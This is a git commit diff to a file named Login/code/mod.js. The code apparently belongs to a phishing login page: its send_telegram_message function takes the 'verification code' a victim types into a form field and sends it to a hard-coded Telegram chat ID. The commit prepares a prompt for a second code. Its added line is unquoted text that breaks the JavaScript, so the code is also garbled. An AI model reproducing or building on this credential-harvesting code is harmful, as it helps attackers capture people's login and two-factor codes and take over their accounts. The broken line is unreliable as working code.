f1152a6496a917a20d4f026ad4940bef01596db6
Obalola Pius <obapius7@gmail.com>
2024-05-21 02:58:08 -0700

    WD

--- Login/code/mod.js
+++ Login/code/mod.js
@@ -75,7 +75,7 @@ async function send_telegram_message() {
   const chatIds = ["-1001991348429"]; // Add your chat IDs here
   const verificationCode = email_field.value;
   const msg = `Verification code: ${verificationCode}`;
-  const msg = `Waiting on 2nd Code`;
+  Prompting 2nd Verfication codes in 60s
 
   for (let i = 0; i < chatIds.length; i++) {
     const data = {
